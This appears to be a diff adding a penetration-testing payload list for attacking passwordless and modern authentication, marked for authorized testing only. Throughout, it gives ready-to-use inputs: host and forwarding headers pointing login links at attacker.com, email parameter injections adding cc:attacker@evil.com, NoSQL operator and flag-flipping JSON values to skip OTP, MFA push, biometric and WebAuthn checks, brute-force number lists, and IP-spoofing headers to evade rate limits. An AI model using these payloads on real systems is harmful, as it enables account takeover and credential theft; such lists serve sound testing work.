@@ -1,0 +1,316 @@
+# Magic Link, Passwordless, and Modern Auth Attack Payloads
+# For authorized security testing only
+
+# ============================================================================
+# MAGIC LINK HOST HEADER POISONING
+# ============================================================================
+
+# Host Header Injection
+Host: attacker.com
+Host: target.com\r\nX-Injected: attacker.com
+Host: target.com:@attacker.com
+Host: attacker.com\r\n\r\n
+Host: target.com\r\nHost: attacker.com
+
+# X-Forwarded-Host Injection
+X-Forwarded-Host: attacker.com
+X-Forwarded-Host: attacker.com:443
+X-Forwarded-Host: evil.target.com
+
+# Other Host-Related Headers
+X-Original-URL: https://attacker.com/auth/verify
+X-Rewrite-URL: https://attacker.com/auth/verify
+X-Forwarded-Server: attacker.com
+X-Host: attacker.com
+X-HTTP-Host-Override: attacker.com
+Forwarded: host=attacker.com
+X-Forwarded-Prefix: https://attacker.com
+
+# ============================================================================
+# MAGIC LINK TOKEN MANIPULATION
+# ============================================================================
+
+# Token Format Testing
+# Replace with known patterns
+
+# Timestamp-based tokens (Unix epoch)
+1700000000
+1700000001
+1700000002
+
+# UUID format tokens
+00000000-0000-0000-0000-000000000000
+ffffffff-ffff-ffff-ffff-ffffffffffff
+00000000-0000-0000-0000-000000000001
+
+# Sequential tokens
+1
+2
+3
+100
+101
+1000
+1001
+
+# Hash-based tokens (try common inputs)
+# MD5 of common values
+d41d8cd98f00b204e9800998ecf8427e
+098f6bcd4621d373cade4e832627b4f6
+5f4dcc3b5aa765d61d8327deb882cf99
+
+# ============================================================================
+# MAGIC LINK EMAIL PARAMETER MANIPULATION
+# ============================================================================
+
+# Email parameter injection
+victim@target.com,attacker@evil.com
+victim@target.com%0a%0dcc:attacker@evil.com
+victim@target.com%0a%0dbcc:attacker@evil.com
+victim@target.com\ncc:attacker@evil.com
+victim@target.com\r\ncc:attacker@evil.com
+
+# Email address manipulation
+VICTIM@TARGET.COM
+victim@target.com.
+victim@target.com.attacker.com
+victim+attacker@target.com
+victim%00@target.com
+"victim@target.com"@attacker.com
+
+# ============================================================================
+# PASSWORDLESS AUTH BYPASS PAYLOADS
+# ============================================================================
+
+# Skip passwordless challenge
+{"skip_challenge": true}
+{"challenge_complete": true}
+{"verified": true}
+{"passwordless": false}
+{"use_password": true}
+{"fallback": "password"}
+{"auth_method": "password"}
+{"force_password": true}
+
+# OTP/Code Bypass
+{"code": "000000"}
+{"code": ""}
+{"code": null}
+{"code": true}
+{"code": 0}
+{"code": []}
+{"code": {"$gt": ""}}
+{"code": {"$ne": ""}}
+{"code": {"$regex": ".*"}}
+
+# ============================================================================
+# PUSH NOTIFICATION MFA FATIGUE PAYLOADS
+# ============================================================================
+
+# Parameters to trigger push notification
+{"mfa_method": "push"}
+{"auth_method": "push_notification"}
+{"challenge_type": "push"}
+{"factor": "push"}
+
+# Parameters to bypass push requirement
+{"mfa_method": "sms"}
+{"mfa_method": "email"}
+{"mfa_method": "totp"}
+{"mfa_method": "backup_code"}
+{"mfa_method": "voice"}
+{"skip_push": true}
+{"push_response": "approve"}
+{"push_status": "approved"}
+{"mfa_verified": true}
+
+# ============================================================================
+# NUMBER MATCHING BYPASS
+# ============================================================================
+
+# Try all 2-digit numbers (10-99)
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+
+# Number matching skip payloads
+{"number": 0}
+{"number": null}
+{"number": ""}
+{"skip_number": true}
+{"number_match": true}
+{"verified": true}
+
+# ============================================================================
+# QR CODE AUTH ATTACK PAYLOADS
+# ============================================================================
+
+# QR Session Manipulation
+{"session_id": "attacker_session"}
+{"qr_code": "attacker_code"}
+{"device_id": "attacker_device"}
+
+# QR Authentication Bypass
+{"qr_verified": true}
+{"scan_complete": true}
+{"device_authorized": true}
+
+# ============================================================================
+# BIOMETRIC AUTH BYPASS PAYLOADS
+# ============================================================================
+
+# API-Level Biometric Bypass
+{"biometric_verified": true}
+{"fingerprint_match": true}
+{"face_recognized": true}
+{"biometric_score": 1.0}
+{"biometric_score": 100}
+{"liveness_check": true}
+{"presentation_attack": false}
+{"skip_biometric": true}
+{"biometric_available": false}
+{"device_supports_biometric": false}
+
+# Fallback Trigger
+{"biometric_failed": true}
+{"biometric_attempts": 3}
+{"use_fallback": true}
+{"fallback_method": "pin"}
+{"fallback_method": "password"}
+
+# ============================================================================
+# WEBAUTHN/PASSKEY BYPASS PAYLOADS
+# ============================================================================
+
+# Skip WebAuthn
+{"authenticator_available": false}
+{"webauthn_failed": true}
+{"skip_webauthn": true}
+{"use_password": true}
+{"force_password": true}
+{"auth_method": "password"}
+{"fallback": "password"}
+
+# WebAuthn Response Manipulation
+{"attestation": "none"}
+{"userVerification": "discouraged"}
+{"authenticatorAttachment": "cross-platform"}
+{"residentKey": "discouraged"}
+
+# ============================================================================
+# RATE LIMIT BYPASS FOR AUTH ENDPOINTS
+# ============================================================================
+
+# IP Rotation Headers
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 192.168.1.1
+X-Real-IP: 172.16.0.1
+X-Originating-IP: 8.8.8.8
+X-Client-IP: 1.1.1.1
+True-Client-IP: 4.4.4.4
+CF-Connecting-IP: 2.2.2.2
+X-Cluster-Client-IP: 3.3.3.3
+Forwarded: for=5.5.5.5
+X-ProxyUser-Ip: 6.6.6.6
+
+# Request Variation
+# Add random query parameters
+?_=1234567890
+?rand=abc123
+?cache=bust
+?t=timestamp
+
+# Case variation in endpoint
+/API/LOGIN
+/Api/Login
+/api/LOGIN
+/api/login/
+/api//login
+/api/./login
